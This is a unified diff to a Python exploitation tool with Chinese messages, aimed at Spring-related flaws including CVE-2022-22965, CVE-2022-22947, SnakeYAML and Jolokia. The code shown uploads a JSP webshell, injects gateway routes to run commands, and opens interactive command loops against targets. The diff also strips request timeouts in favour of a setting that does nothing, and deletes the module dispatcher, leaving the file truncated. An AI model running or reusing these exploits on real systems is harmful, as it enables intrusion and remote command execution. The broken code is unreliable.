@@ -9,6 +9,7 @@ from termcolor import cprint
 from time import sleep
 import urllib3
 urllib3.disable_warnings()
+requests.timeout = 12
 
 ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
@@ -52,16 +53,16 @@ def CVE_2022_22965(url, proxies, header_new):
     getpayload = url + payload_http
     try:
         requests.packages.urllib3.disable_warnings()
-        requests.post(url, headers=Headers_2, data=file_date_data, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        requests.post(url, headers=Headers_2, data=payload_other, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        requests.post(url, headers=Headers_1, data=payload_linux, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        requests.post(url, headers=Headers_2, data=file_date_data, allow_redirects=False, verify=False, proxies=proxies)
+        requests.post(url, headers=Headers_2, data=payload_other, allow_redirects=False, verify=False, proxies=proxies)
+        requests.post(url, headers=Headers_1, data=payload_linux, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        requests.post(url, headers=Headers_1, data=payload_win, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        requests.post(url, headers=Headers_1, data=payload_win, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        requests.get(getpayload, headers=Headers_1, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        test = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        test_again = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        test = requests.get(url + "shell.jsp", allow_redirects=False, verify=False, proxies=proxies)
+        test_again = requests.get(url + "shell.jsp", allow_redirects=False, verify=False, proxies=proxies)
         if (test_again.status_code == 200):
             cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?pwd=tomcat&cmd=whoami" ,"red")
             while 1:
@@ -106,7 +107,7 @@ def CVE_2022_22963(url, proxies, header_new):
     try:
         url = url + path
         requests.packages.urllib3.disable_warnings()
-        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
+        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies)
         code = req.status_code
         text = req.text
         rsp = '"error":"Internal Server Error"'
@@ -154,9 +155,9 @@ def CVE_2022_22947(url, proxies, header_new):
     try:
         cprint("[+] 正在发送Linux的Payload","green")
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, json=json ,verify=False, proxies=proxies)
+        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             cprint("[+] Payload已经输出，回显结果如下：", "red")
             print('\n')
@@ -166,13 +167,13 @@ def CVE_2022_22947(url, proxies, header_new):
             vul_status = 1
         else:
             cprint("[.] Linux的Payload没成功，清理缓存","green")
-            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
             cprint("[+] 正在发送Windows的Payload","green")
             requests.packages.urllib3.disable_warnings()
-            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
-            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, json=json ,verify=False, proxies=proxies)
+            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
             if ('<DIR>' in str(re3.text)):
                 cprint("[+] Payload已经输出，回显结果如下：", "red")
                 print('\n')
@@ -182,20 +183,20 @@ def CVE_2022_22947(url, proxies, header_new):
                 vul_status = 1
         if vul_status == 0:
             cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
-            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
         while vul_status == 1:
             Cmd = input("[+] 请输入要执行的命令>>> ")
             if Cmd == "exit":
-                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
                 print("[+] 删除路由成功")
                 sys.exit()
             else:
                 payload_new = payload_windows.replace('dir', Cmd)
-                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_new, headers=headers1, timeout=10, json=json ,verify=False, proxies=proxies)
-                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_new, headers=headers1, json=json ,verify=False, proxies=proxies)
+                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                 result = re3.text
                 cprint(result ,"green")
                 print('\n')
@@ -258,13 +259,13 @@ def JolokiaRCE(url, proxies, header_new):
     headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + path1, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + path1, headers=headers1, allow_redirects=False, verify=False, proxies=proxies)
         code1 = re1.status_code
-        re2 = requests.post(url=url + path2, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + path2, headers=headers1, allow_redirects=False, verify=False, proxies=proxies)
         code2 = re2.status_code
         if ((int(code1) == 200) or (int(code2) == 200)):
             cprint("[+] 发现jolokia相关路径状态码为200，进一步验证", "red")
-            retest = requests.get(url=url + path3, timeout=10, verify=False, proxies=proxies)
+            retest = requests.get(url=url + path3, verify=False, proxies=proxies)
             code3 = retest.status_code
             if ('reloadByURL' in str(retest.text)) and (code3 == 200):
                 cprint(f'[+] {url} 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：', "red")
@@ -296,10 +297,10 @@ def CVE_2021_21234(url,proxies, header_new):
     headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + payload1, headers=headers1, timeout=10, verify=False, proxies=proxies)
-        re2 = requests.post(url=url + payload2, headers=headers1, timeout=10, verify=False, proxies=proxies)
-        re3 = requests.post(url=url + payload3, headers=headers1, timeout=10, verify=False, proxies=proxies)
-        re4 = requests.post(url=url + payload4, headers=headers1, timeout=10, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + payload1, headers=headers1, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + payload2, headers=headers1, verify=False, proxies=proxies)
+        re3 = requests.post(url=url + payload3, headers=headers1, verify=False, proxies=proxies)
+        re4 = requests.post(url=url + payload4, headers=headers1, verify=False, proxies=proxies)
         if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
             cprint("[+] 发现Spring Boot目录遍历漏洞且系统为Win，Poc路径如下：", "red")
             cprint(url + payload1, "red")
@@ -337,8 +338,8 @@ def SnakeYAML_RCE(url, proxies, header_new):
     try:
         requests.packages.urllib3.disable_warnings()
         urltest = url + path
-        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
         if ('example.yml' in str(re1.text)):
             cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：", "red")
             cprint('漏洞存在路径为 ' + urltest + '\n', "red")
@@ -378,8 +379,8 @@ def Eureka_xstream_RCE(url, proxies, header_new):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
         if ('127.0.0.2' in str(re1.text)):
             cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 1.x：", "red")
             cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
@@ -414,7 +415,7 @@ def CVE_2018_1273(url, proxies, header_new):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.get(url=urltest1, headers=Headers, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.get(url=urltest1, headers=Headers, allow_redirects=False, verify=False, proxies=proxies)
         code1 = re1.status_code
         if ((int(code1) == 200) and ('Users' in str(re1.text))):
             cprint("[+] 发现Spring_Data_Commons远程命令执行漏洞：", "red")
@@ -430,50 +431,4 @@ def CVE_2018_1273(url, proxies, header_new):
                 if Cmd == "exit":
                     sys.exit(0)
                 else:
-                    re2 = requests.post(url=urltest2, data=payload3, headers=Headers, timeout=10, verify=False, proxies=proxies)
-                    code2 = re2.status_code
-                    if (int(code2) != 503):
-                        cprint('[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n', "red")
-        else:
-            cprint("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n", "yellow")
-    except KeyboardInterrupt:
-        print("Ctrl + C 手动终止了进程")
-        sys.exit()
-    except Exception as e:
-        print("[-] 发生错误，已记入日志error.log\n")
-        f2 = open("error.log", "a")
-        f2.write(str(e) + '\n')
-        f2.close()
-
-def vul(url, proxies, header_new):
-    functions = {
-        1: JeeSpring_2023,
-        2: CVE_2022_22947,
-        3: CVE_2022_22963,
-        4: CVE_2022_22965,
-        5: CVE_2021_21234,
-        6: SnakeYAML_RCE,
-        7: Eureka_xstream_RCE,
-        8: JolokiaRCE,
-        9: CVE_2018_1273,
-    }
-    cprint("[+] 目前漏洞库内容如下：","green")
-    for num, func in functions.items():
-        print(f" {num}: {func.__name__}")
-    try:
-        choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
-        if choices == '':
-            choices = "1,2,3,4,5,6,7,8,9"
-        choices = [int(choice) for choice in choices.split(',')]
-    except Exception as e:
-        print("请不要输入无意义的字符串")
-        sys.exit()
-    for choice in choices:
-        selected_func = functions.get(choice)
-        if selected_func:
-            selected_func(url, proxies, header_new)
-        else:
-            print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
-            break
-    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
-    sys.exit()
+                    re2 = requests.post(url=urltest2, data=payload3, headers=Headers, verify=False, proxies=proxies)
